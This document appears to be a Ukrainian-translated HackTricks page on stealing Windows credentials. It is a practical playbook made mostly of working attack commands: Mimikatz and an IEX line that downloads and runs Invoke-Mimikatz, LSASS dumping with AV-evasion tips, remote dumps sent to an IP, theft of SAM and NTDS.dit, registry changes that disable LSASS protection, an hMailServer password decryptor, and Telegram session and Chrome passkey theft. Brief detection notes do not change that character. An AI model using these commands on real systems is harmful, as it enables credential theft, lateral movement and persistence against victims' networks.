# Викрадення облікових даних Windows

{{#include ../../banners/hacktricks-training.md}}

## Облікові дані Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Знайдіть інші можливості Mimikatz на** [**цій сторінці**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Дізнайтеся про деякі можливі засоби захисту облікових даних тут.**](credentials-protections.md) **Ці засоби захисту можуть запобігти вилученню деяких облікових даних за допомогою Mimikatz.**

## Credentials with Meterpreter

Використовуйте [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **який** я створив, щоб **шукати паролі та хеші** всередині цілі.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Обхід AV

### Procdump + Mimikatz

Оскільки **Procdump від** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є легітимним інструментом Microsoft**, Defender його не виявляє.\
Ви можете використовувати цей інструмент, щоб **зробити dump процесу lsass**, **завантажити dump** і **видобути** **облікові дані локально** з dump.

Також можна використовувати [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Цей процес автоматично виконується за допомогою [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Примітка**: Деякі **AV** можуть **виявляти** використання **procdump.exe для дампу lsass.exe** як **шкідливе**, оскільки вони **виявляють** рядки **"procdump.exe" і "lsass.exe"**. Тому **скритніше** передавати **PID** lsass.exe до procdump як **аргумент**, а не **назву lsass.exe**.

### Дамп lsass за допомогою **comsvcs.dll**

DLL із назвою **comsvcs.dll**, розташована в `C:\Windows\System32`, відповідає за **дамп пам'яті процесу** у разі збою. Ця DLL містить **функцію** **`MiniDumpW`**, призначену для виклику за допомогою `rundll32.exe`.\
Перші два аргументи використовувати необов'язково, але третій поділяється на три компоненти. Першим компонентом є ідентифікатор процесу, який потрібно отримати в дамп, другим — шлях до файлу дампу, а третім компонентом має бути виключно слово **full**. Альтернативних параметрів не існує.\
Після обробки цих трьох компонентів DLL створює файл дампу та записує до нього пам'ять указаного процесу.\
Використання **comsvcs.dll** дає змогу отримати дамп процесу lsass, усуваючи потребу завантажувати та запускати procdump. Цей метод докладно описано на [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Для виконання використовується така команда:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Цей процес можна автоматизувати за допомогою** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Створення дампа lsass за допомогою Task Manager**

1. Клацніть правою кнопкою миші на панелі завдань і виберіть Task Manager
2. Клацніть More details
3. На вкладці Processes знайдіть процес "Local Security Authority Process"
4. Клацніть правою кнопкою миші на процесі "Local Security Authority Process" і виберіть "Create dump file".

### Створення дампа lsass за допомогою procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) — це двійковий файл, підписаний Microsoft, який є частиною набору [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass за допомогою PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) — це Protected Process Dumper Tool, який підтримує обфускацію memory dump і його передавання на віддалені робочі станції без запису на диск.

**Основні функціональні можливості**:

1. Обхід захисту PPL
2. Обфускація файлів memory dump для обходу механізмів виявлення Defender на основі сигнатур
3. Завантаження memory dump за допомогою методів RAW і SMB без запису на диск (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – отримання дампа LSASS на основі SSP без MiniDumpWriteDump

Ink Dragon постачає dumper із трьох етапів під назвою **LalsDumper**, який ніколи не викликає `MiniDumpWriteDump`, тому EDR hooks цього API ніколи не спрацьовують:<sup>[[3]](#references)</sup>

1. **Завантажувач етапу 1 (`lals.exe`)** – шукає у `fdp.dll` placeholder, що складається з 32 символів нижнього регістру `d`, замінює його на абсолютний шлях до `rtu.txt`, зберігає пропатчену DLL як `nfdp.dll` і викликає `AddSecurityPackageA("nfdp","fdp")`. Це змушує **LSASS** завантажити шкідливу DLL як нового Security Support Provider (SSP).
2. **Етап 2 усередині LSASS** – коли LSASS завантажує `nfdp.dll`, DLL читає `rtu.txt`, виконує XOR кожного байта з `0x20` і відображає декодований blob у пам'ять перед передаванням керування.
3. **Етап 3 dumper** – відображене payload повторно реалізує логіку MiniDump за допомогою **direct syscalls**, отриманих із хешованих назв API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Спеціально визначений export із назвою `Tom` відкриває `%TEMP%\<pid>.ddt`, записує стиснений дамп LSASS у файл і закриває handle, щоб exfiltration можна було виконати пізніше.

Примітки для оператора:

* Зберігайте `lals.exe`, `fdp.dll`, `nfdp.dll` і `rtu.txt` в одному каталозі. Етап 1 замінює hard-coded placeholder на абсолютний шлях до `rtu.txt`, тому їх розділення порушує ланцюжок.
* Реєстрація відбувається шляхом додавання `nfdp` до `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Ви можете самостійно додати це значення, щоб змусити LSASS перезавантажувати SSP під час кожного завантаження системи.
* Файли `%TEMP%\*.ddt` є стисненими дампами. Розпакуйте їх локально, а потім передайте до Mimikatz/Volatility для вилучення облікових даних.
* Для запуску `lals.exe` потрібні права адміністратора/SeTcb, щоб `AddSecurityPackageA` виконався успішно; після повернення виклику LSASS прозоро завантажує rogue SSP і виконує етап 2.
* Видалення DLL із диска не вивантажує її з LSASS. Або видаліть запис реєстру та перезапустіть LSASS (перезавантажте систему), або залиште його для довготривалої persistence.

## CrackMapExec

### Отримання хешів SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Вивантаження секретів LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Вивантаження NTDS.dit із цільового DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Здампити історію паролів NTDS.dit із цільового DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Показати атрибут pwdLastSet для кожного облікового запису NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Викрадення SAM і SYSTEM

Ці файли мають бути **розташовані** в _C:\windows\system32\config\SAM_ і _C:\windows\system32\config\SYSTEM._ Але **ви не можете просто скопіювати їх звичайним способом**, оскільки вони захищені.

### З реєстру

Найпростіший спосіб викрасти ці файли — отримати їхню копію з реєстру:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Завантажте** ці файли на свою машину Kali та **витягніть хеші** за допомогою:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Тіньова копія тому

За допомогою цієї служби можна копіювати захищені файли. Потрібні права Адміністратора.

#### Використання vssadmin

Бінарний файл vssadmin доступний лише у версіях Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Але те саме можна зробити з **Powershell**. Це приклад того, **як скопіювати файл SAM** (використовується жорсткий диск "C:", а файл зберігається в C:\users\Public), але цей спосіб можна використовувати для копіювання будь-якого захищеного файлу:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Код із книги: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Насамкінець, ви також можете використати [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), щоб створити копію SAM, SYSTEM і ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Облікові дані Active Directory - NTDS.dit**

Файл **NTDS.dit** відомий як серце **Active Directory**, що містить важливі дані про об'єкти користувачів, групи та їхнє членство. Саме тут зберігаються **хеші паролів** користувачів домену. Цей файл є базою даних **Extensible Storage Engine (ESE)** і розташований за шляхом **_%SystemRoom%/NTDS/ntds.dit_**.

У цій базі даних підтримуються три основні таблиці:

- **Data Table**: ця таблиця призначена для зберігання відомостей про такі об'єкти, як користувачі та групи.
- **Link Table**: вона відстежує зв'язки, наприклад членство в групах.
- **SD Table**: тут зберігаються **дескриптори безпеки** для кожного об'єкта, що забезпечує безпеку та контроль доступу до збережених об'єктів.

Дослідження Christoffer Andersson щодо рівня бази даних докладніше описує ці таблиці та їхню поведінку у різних версіях.<sup>[[8]](#references)</sup>

Windows використовує _Ntdsa.dll_ для взаємодії з цим файлом, а його використовує _lsass.exe_. Тому **частина** файлу **NTDS.dit** може перебувати в пам'яті **`lsass`** (імовірно, можна знайти нещодавно використані дані завдяки підвищенню продуктивності за допомогою **кешу**).

#### Розшифрування хешів усередині NTDS.dit

Хеш шифрується тричі:

1. Розшифрувати ключ шифрування паролів (**PEK**) за допомогою **BOOTKEY** і **RC4**.
2. Розшифрувати **хеш** за допомогою **PEK** і **RC4**.
3. Розшифрувати **хеш** за допомогою **DES**.

**PEK** має **однакове значення на кожному контролері домену**, але він **зашифрований** усередині **NTDS.dit** за допомогою специфічного для DC **BOOTKEY** із куща **SYSTEM** цього контролера домену. Тому для вилучення облікових даних потрібні і **NTDS.dit**, і **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Копіювання NTDS.dit за допомогою Ntdsutil

Доступно, починаючи з Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Ви також можете використати трюк [**volume shadow copy**](#stealing-sam-and-system), щоб скопіювати файл **ntds.dit**. Пам’ятайте, що вам також знадобиться копія **SYSTEM file** (знову ж таки, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).

### **Видобування hashes з NTDS.dit**

Після того як ви **отримали** файли **NTDS.dit** і **SYSTEM**, ви можете використати такі інструменти, як _secretsdump.py_, щоб **видобути hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ви також можете **автоматично витягнути їх** за допомогою дійсного користувача-адміністратора домену:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Для **великих файлів NTDS.dit** рекомендується виконувати їхнє вилучення за допомогою [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Зрештою, також можна використати **модуль metasploit**: _post/windows/gather/credentials/domain_hashdump_ або **mimikatz** `lsadump::lsa /inject`

### **Вилучення об'єктів домену з NTDS.dit до бази даних SQLite**

Об'єкти NTDS можна вилучити до бази даних SQLite за допомогою [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Вилучаються не лише секрети, а й усі об'єкти та їхні атрибути для подальшого вилучення інформації, коли raw-файл NTDS.dit уже отримано.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Hive `SYSTEM` є необов'язковим, але дає змогу розшифровувати секрети (NT- та LM-хеші, додаткові облікові дані, як-от паролі у відкритому тексті, ключі Kerberos або trust, історію паролів NT та LM). Разом з іншою інформацією витягуються такі дані: облікові записи користувачів і машин із їхніми хешами, прапорці UAC, часові мітки останнього входу та зміни пароля, описи облікових записів, імена, UPN, SPN, групи та рекурсивне членство в них, дерево organizational units і членство в них, trusted domains із типом, напрямком і атрибутами trust...

## Lazagne

Завантажте binary [here](https://github.com/AlessandroZ/LaZagne/releases). Цей binary можна використовувати для витягування облікових даних із різного software.
```
lazagne.exe all
```
## Інші інструменти для вилучення облікових даних із SAM і LSASS

### Windows credentials Editor (WCE)

Цей інструмент можна використовувати для вилучення облікових даних із пам'яті. Завантажте його з: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Вилучення облікових даних із файлу SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Витягування облікових даних із файлу SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Завантажте його з:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) і просто **execute it** — паролі буде extracted.

## Збір даних про неактивні RDP-сесії та послаблення security controls

FinalDraft RAT від Ink Dragon містить tasker `DumpRDPHistory`, техніки якого корисні для будь-якого red-teamer:<sup>[[3]](#references)</sup>

### Збір телеметрії у стилі DumpRDPHistory

* **Вихідні RDP-цілі** — проаналізуйте кожен user hive за адресою `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Кожен підрозділ реєстру зберігає ім’я сервера, `UsernameHint` і timestamp останнього запису. Логіку FinalDraft можна відтворити за допомогою PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Докази вхідних RDP-підключень** — виконайте запит до журналу `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` для Event ID **21** (успішний logon) і **25** (disconnect), щоб визначити, хто адміністрував систему:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Дізнавшись, який Domain Admin регулярно підключається, виконайте dump LSASS (за допомогою LalsDumper/Mimikatz), поки його **disconnected** session ще існує. CredSSP + NTLM fallback залишає його verifier і tokens у LSASS, після чого їх можна replay через SMB/WinRM, щоб отримати `NTDS.dit` або розгорнути persistence на domain controllers.

### Downgrade реєстру, націлені FinalDraft

Цей implant також змінює кілька registry keys, щоб спростити credential theft:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Встановлення `DisableRestrictedAdmin=1` змушує використовувати повне повторне використання облікових даних/квитків під час RDP, уможливлюючи переміщення в стилі pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` вимикає фільтрацію токенів UAC, тому локальні адміністратори отримують необмежені токени через мережу.
* `DSRMAdminLogonBehavior=2` дає адміністратору DSRM змогу входити в систему, коли DC працює, надаючи зловмисникам ще один вбудований обліковий запис із високими привілеями.
* `RunAsPPL=0` вимикає захист LSASS PPL, що робить доступ до пам'яті тривіальним для інструментів дампінгу, таких як LalsDumper.

## Облікові дані бази даних hMailServer (після компрометації)

hMailServer зберігає пароль до DB у `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` під `[Database] Password=`. Значення зашифроване за допомогою Blowfish зі статичним ключем `THIS_KEY_IS_NOT_SECRET` і перестановками порядку байтів 4-байтових слів. Використайте hex-рядок з INI із цим фрагментом Python:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Маючи пароль у відкритому тексті, скопіюйте базу даних SQL CE, щоб уникнути блокування файлу, завантажте 32-бітний provider і за потреби оновіть його перед запитом хешів:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Колонка `accountpassword` використовує формат хешу hMailServer (режим hashcat `1421`). Cracking цих значень може надати повторно використовувані облікові дані для WinRM/SSH pivots.

## Перехоплення LSA Logon Callback (LsaApLogonUserEx2)

Деякі інструменти захоплюють **plaintext logon passwords**, перехоплюючи LSA logon callback `LsaApLogonUserEx2`. Ідея полягає в тому, щоб підключити hook або обгорнути callback authentication package, аби облікові дані захоплювалися **під час logon** (до хешування), а потім записувалися на диск або поверталися оператору. Зазвичай це реалізується як helper, який inject-иться в LSA або реєструється в ньому, після чого записує кожну успішну подію interactive/network logon із username, domain і password.<sup>[[1]](#references)</sup>

Операційні примітки:
- Потрібні local admin/SYSTEM для завантаження helper у authentication path.
- Захоплені облікові дані з'являються лише під час logon (interactive, RDP, service або network logon залежно від hook).

## Збережені облікові дані підключень SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) зберігає інформацію про збережені підключення у файлі `sqlstudio.bin` для кожного користувача. Спеціальні dumpers можуть проаналізувати файл і відновити збережені SQL credentials. У shell, які повертають лише вивід команд, файл часто exfil-иться шляхом кодування в Base64 і виведення до stdout.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
На стороні оператора перебудуйте файл і запустіть dumper локально, щоб відновити облікові дані:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Telegram Desktop `tdata`: крадіжка сесії

Telegram Desktop зберігає дані авторизації та стан облікового запису у своєму каталозі **`tdata`**. Скопійовану сесію можна завантажити за допомогою сумісного tooling, щоб пройти автентифікацію без пароля облікового запису, доки ця авторизація залишається дійсною; якщо ввімкнено шифрування локальних даних, stealer також потребує коду доступу. Автентифікована сесія може розкрити дані про особу, метадані діалогів і членства, повідомлення та медіафайли, доступні для завантаження.<sup>[[10]](#references)</sup>

### Пошук і отримання

Шукайте як встановлені, так і portable-версії; назви пакетів Microsoft Store можуть відрізнятися, тому перераховуйте каталоги пакетів, що містять `TelegramMessenge`, і перевіряйте їхнє піддерево `LocalCache\Roaming`.<sup>[[10]](#references)</sup>
```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
Where-Object Name -Like '*TelegramMessenge*' |
ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```
Якщо звичайне читання не вдається, а токен процесу **вже містить і активує** `SeBackupPrivilege`, доступ із підтримкою backup є резервним варіантом; він не отримує привілей і не підвищує рівень прав процесу. `CreateFileW` із `FILE_FLAG_BACKUP_SEMANTICS` може запитувати семантику backup/restore та обходити перевірки безпеки файлів, коли необхідні привілеї токена наявні, але сам прапорець не долає несумісне блокування спільного доступу.<sup>[[10]](#references)[[11]](#references)</sup>

Для файлів, заблокованих під час роботи, створіть/прочитайте **Volume Shadow Copy**; для файлів, доступ до яких заблокований ACL, `robocopy /B` використовує backup mode і обходить ACL файлів та каталогів.<sup>[[10]](#references)[[12]](#references)</sup>
```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```
Імплант, орієнтований на економне використання bandwidth, може спочатку надіслати лише інвентаризацію шляхів до файлів, отримати ідентифікатор snapshot і шляхи, які вже збережені C2, а потім завантажити лише відсутні файли. Тому невеликі інкрементальні передачі після рекурсивного перерахування `tdata` усе ще можуть свідчити про успішну крадіжку сесії.<sup>[[10]](#references)</sup>

### Виявлення та локалізація

Корелюйте рекурсивний доступ до `tdata` процесом, який не належить Telegram, з активацією `SeBackupPrivilege`, відкриттям файлів із backup-semantics, активністю VSS або дочірнім `robocopy.exe`, що використовує `/B`. Також шукайте швидке перерахування як `%APPDATA%`, так і `%LOCALAPPDATA%\Packages`, після якого з того самого процесу встановлюються вихідні з'єднання. Після компрометації використовуйте **Settings → Devices** (або **Privacy & Security → Active Sessions**), щоб завершити роботу невідомих сесій; саме ввімкнення двоетапної перевірки не відкликає авторизацію, яку вже було викрадено.<sup>[[10]](#references)[[13]](#references)</sup>

## Крадіжка облікових даних Passkeys / WebAuthn із Chrome у Windows

Якщо на Windows-хості отримано виконання коду від імені **користувача-жертви**, який використовує **Chrome + синхронізовані passkeys у Google Password Manager**, passkeys стають цікавою ціллю для post-exploitation навіть **без admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Цікаві локальні артефакти
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** зберігає protobuf-кодовані записи **`WebauthnCredentialSpecifics`**. Процес, що працює від імені того самого користувача, може перелічити **RP ID**, **ім’я користувача**, **ідентифікатор облікових даних** і зашифровані матеріали приватного ключа синхронізованих passkeys.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** зберігає стан реєстрації локального пристрою, зокрема **`wrapped_identity_private_key`** і загорнутий секрет, який використовується для відновлення синхронізованих облікових даних.<sup>[[4]](#references)</sup>

Швидка первинна перевірка:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### Прив’язані до TPM ключові blobs все одно можуть використовуватися як локальний оракул підписування

Якщо браузер експортує ідентифікаційний ключ, захищений TPM, як **`NCRYPT_OPAQUE_KEY_BLOB`** і зберігає цей blob у доступному користувачу стані, malware **не потрібно** вилучати необроблений приватний ключ. Воно може просто повторно імпортувати blob на **тому самому комп’ютері** й попросити локальний TPM підписати дані, контрольовані зловмисником:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Це означає, що **hardware binding запобігає експорту за межі пристрою, але не перешкоджає використанню тим самим користувачем на скомпрометованій кінцевій точці**.

### Практичні шляхи зловживання

1. **Ретрансляція pass-ta-key / ідентичності пристрою**<sup>[[4]](#references)</sup>
- Перелічити `WebauthnCredentialSpecifics` із Chrome LevelDB.
- Розпочати вхід за допомогою passkey та отримати свіжий WebAuthn challenge.
- Використати викрадений blob `wrapped_identity_private_key` на TPM жертви для підпису binding-запиту cloud-authenticator.
- Передати отриманий assertion relying party.
- Це особливо цінно, коли RP приймає `userVerification=preferred` або не відхиляє assertions із **`UV=0`**.
2. **Перехоплення pending UV-key**<sup>[[4]](#references)</sup>
- Примусово повторно виконати onboarding, видаливши `passkey_enclave_state` або надіславши дійсну підписану операцію `device/forget`.
- Якщо після onboarding пристрій переходить у стан **`uv_key_pending`**, зареєструвати контрольований атакувальником UV public key.
- Якщо provider не перевіряє attestation / походження з secure-hardware для нового UV key, подальші підписи ключем атакувальника трактуються як **`UV=1`**.
3. **Викрадення master-secret / відновлення SDS**<sup>[[4]](#references)</sup>
- Примусово запустити recovery або rejoin, щоб Chrome отримав synced-passkey master secret.
- Відстежувати повторне створення/зміну `passkey_enclave_state`, а потім зробити dump пам'яті Chrome, поки plaintext **security domain secret (SDS)** перебуває в пам'яті.
- Використати отриманий SDS для розшифрування зашифрованих полів у кожному записі `WebauthnCredentialSpecifics` та відновити portable WebAuthn private keys.

### Ідеї для DFIR / виявлення

- Відстежувати **видалення/повторне створення** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Створювати alert щодо аномального доступу до Chrome **`Sync Data\LevelDB`** з боку процесів, відмінних від browser.
- Створювати alert щодо **дампів пам'яті Chrome** або підозрілого доступу до пам'яті між процесами.
- Розслідувати повторювані запити **Google Password Manager recovery PIN** або неочікуваний re-onboarding.
- Пам'ятайте, що WebAuthn **`signCount`** часто не є корисним для synced passkeys, оскільки може залишатися сталим, тому класичне виявлення клонів є ненадійним.

## References

- [1] [Unit 42 – Розслідування багаторічних непомічених операцій, спрямованих на високопріоритетні сектори](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: фішинг через макрос Word VBA за допомогою SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Всередині Ink Dragon: розкриття relay-мережі та внутрішньої роботи прихованої offensive operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: нова attack surface у passwordless authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / сховище ключів CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: атаки на системи та мережі Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Як насправді працює сховище даних Active Directory: всередині NTDS.dit (частина 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – віддалений dump паролів Lsass](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho розширює свій арсенал кіберespionage за допомогою toolkit Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – функція CreateFileW та `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
